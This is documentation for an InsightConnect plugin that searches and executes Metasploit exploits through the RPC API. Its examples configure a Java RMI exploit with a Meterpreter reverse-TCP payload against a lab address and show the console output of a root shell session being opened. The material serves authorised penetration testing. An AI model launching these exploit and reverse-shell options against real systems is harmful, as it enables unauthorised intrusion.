# Description

[Metasploit Framework](https://www.metasploit.com/) is the world's most used penetration testing framework.
Make the premier penetration testing solution even more powerful with the ability to search and execute Exploits using this InsightConnect plugin. Automate your pen-tests and find the weak points in your environments faster with remote execution of exploits and retrieve the results for further analysis.

This plugin utilizes the Metasploit [RPC API](https://metasploit.help.rapid7.com/docs/rpc-api).

# Key Features

* Search for exploits
* Execute exploits

# Requirements

* Username and password

# Supported Product Versions

* 4.20.0-2021091301

# Documentation

## Setup

The connection configuration accepts the following parameters:

|Name|Type|Default|Required|Description|Enum|Example|
|----|----|-------|--------|-----------|----|-------|
|credentials|credential_username_password|None|True|Username and password|None|{"username": example, "password": example}|
|port|integer|55553|False|Port|None|55553|
|server|string|None|False|Remote server IP|None|https://example.com|
|ssl|boolean|True|False|Use SSL|None|True|
|uri|string|/api/|False|The msfrpcd URI|None|/api/|

Example input:

```
{
  "credentials": {
    "username": example, 
    "password": example
  }",
  "port": 55553,
  "server": "example.com",
  "ssl": true,
  "uri": "/api/"
}
```

## Technical Details

### Actions

#### Search for Exploit

This action is used to search for an exploit within Metasploit over an RPC session.

##### Input

|Name|Type|Default|Required|Description|Enum|Example|
|----|----|-------|--------|-----------|----|-------|
|search_term|string|None|True|Search term, e.g. 'vsftp'|None|vsftp|

Example input:

```
{
  "search_term": "vsftp"
}
```

##### Output

|Name|Type|Required|Description|
|----|----|--------|-----------|
|search_results|search_results|False|Search results from Metasploit|

Example output:

```

{
  "search_results": {
    "post_exploits": [],
    "auxiliaries": [
      "scanner/http/intel_amt_digest_bypass"
    ],
    "exploits": [
      "multi/http/git_submodule_command_exec"
    ]
  }
}

```

#### Execute Exploit

This action is used to run a selected Metasploit exploit.

##### Input

|Name|Type|Default|Required|Description|Enum|Example|
|----|----|-------|--------|-----------|----|-------|
|module|string|None|True|A Metasploit module|None|exploit/multi/misc/java_rmi_server|
|options|object|None|False|Metasploit module options|None|{"RHOST":"10.0.2.5", "RPORT":"1099", "LHOST":"10.0.2.15", "payload":"java/meterpreter/reverse_tcp"}|
Example input:

```
{
  "module": "exploit/multi/misc/java_rmi_server",
  "options": {
    "RHOST": "10.0.2.5",
    "RPORT": "1099",
    "LHOST": "10.0.2.15",
    "payload": "java/meterpreter/reverse_tcp"
  }
}
```

##### Output

|Name|Type|Required|Description|
|----|----|--------|-----------|
|console_output|[]string|False|Information from the console when a module is executed|
|session_information|session_info|False|Session information provided when a module is executed|

Example output:

```

{
  "session_information": {
    "info": "",
    "username": "root",
    "session_port": 1099,
    "via_payload": "payload/java/meterpreter/reverse_tcp",
    "uuid": "3vxgkpvv",
    "tunnel_local": "10.0.2.15:4444",
    "via_exploit": "exploit/multi/misc/java_rmi_server",
    "arch": "java",
    "exploit_uuid": "a2r4nsto",
    "tunnel_peer": "10.0.2.5:48164",
    "platform": "java",
    "session_id": 63,
    "workspace": "false",
    "routes": "",
    "target_host": "10.0.2.5",
    "type": "meterpreter",
    "session_host": "10.0.2.5",
    "desc": "Meterpreter"
  },
  "console_output": [
    "Exploit running as background job 110.",
    "Started reverse TCP handler on 10.0.2.15:4444 ",
    "10.0.2.5:1099 - Using URL: http://0.0.0.0:8080/YA3YZGmuDgip",
    "10.0.2.5:1099 - Local IP: http://10.0.2.15:8080/YA3YZGmuDgip",
    "10.0.2.5:1099 - Server started.",
    "10.0.2.5:1099 - Sending RMI Header...",
    "10.0.2.5:1099 - Sending RMI Call...",
    "10.0.2.5:1099 - Replied to request for payload JAR",
    "Sending stage (53837 bytes) to 10.0.2.5"
  ]
}

```

### Triggers

#### New Modules

This trigger is used to check for new Metasploit modules.

##### Input

_This trigger does not contain any inputs._

##### Output

|Name|Type|Required|Description|
|----|----|--------|-----------|
|module|module|False|New Module|

Example output:

```

{
  "module": {
    "mod_time": "2018-04-03 15:16:13 +0000",
    "is_client": false,
    "description": "This module exploits the trusted $PATH environment variable of the SUID binary \"ibstat\".",
    "author": ["Example Name", "John Doe <user@example.com>",
    "Example User <user@example.com>"],
    "arch": "cmd",
    "rank": 600,
    "is_server": true, "disclosure_date": "2013-09-24",
    "platform": "Unix",
    "references": ["CVE-2013-4011", "OSVDB-95420", "BID-61287", "URL-http://www-01.ibm.com/support/docview.wss?uid=isg1IV43827",
    "URL-http://www-01.ibm.com/support/docview.wss?uid=isg1IV43756"],
    "full_name": "exploit/aix/local/ibstat_path",
    "path": "/modules/exploits/aix/local/ibstat_path.rb",
    "is_install_path": true,
    "ref_name": "aix/local/ibstat_path",
    "type": "exploit", "targets": ["IBM AIX Version 6.1", "IBM AIX Version 7.1"],
    "rport": "",
    "name": "ibstat $PATH Privilege Escalation"
  }
}

```

### Custom Output Types

_This plugin does not contain any custom output types._

## Troubleshooting

This plugin does not contain any troubleshooting information.

# Version History

* 3.0.0 - Fixed bugs: changed type, updated internal library, added error handling
* 2.0.1 - New spec and help.md format for the Extension Library
* 2.0.0 - Update to new credential types
* 1.0.4 - Update to use new JSON API
* 1.0.3 - Support web server mode
* 1.0.2 - Bugfix: Plugin could occasionally crash due to unhandled unicode characters while searching for exploits
* 1.0.1 - Update Ruby script release
* 1.0.0 - Trigger added: New Modules
* 0.1.0 - Initial plugin

# Links

## References

* [Metasploit](https://www.metasploit.com/)
* [RPC API](https://metasploit.help.rapid7.com/docs/rpc-api)

